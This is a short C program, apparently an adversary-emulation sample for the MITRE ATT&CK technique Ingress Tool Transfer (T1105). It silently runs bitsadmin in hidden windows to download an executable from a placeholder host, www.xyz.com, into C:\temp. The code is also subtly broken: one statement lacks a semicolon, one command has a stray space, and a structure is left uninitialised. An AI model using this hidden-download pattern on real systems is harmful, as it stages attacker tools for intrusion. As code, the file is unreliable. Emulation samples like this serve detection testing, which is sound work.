// Link      = https://attack.mitre.org/techniques/T1105/
// Technique = Ingress Tool Transfer
// ID        = T1105
// Tactics   = Command and Control,

#include <windows.h>

#define RUN(to_run) \
    si.cb = sizeof(STARTUPINFOA); \
    if (CreateProcessA(NULL, (LPSTR)to_run, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { \
        WaitForSingleObject(pi.hProcess, INFINITE); \
        CloseHandle(pi.hProcess); \
        CloseHandle(pi.hThread); \
    }

int main() {
    STARTUPINFOA si;    
    PROCESS_INFORMATION pi;

    RUN("bitsadmin /create jb1");
    RUN("bitsadmin /addfile jb1 \"http://www.xyz.com/x.exe\" \"C:\\temp\\x.exe\"");
    RUN("bitsadmin /resume jb1");
    RUN("bitsadmin / complete jb1")

    return 0;
}
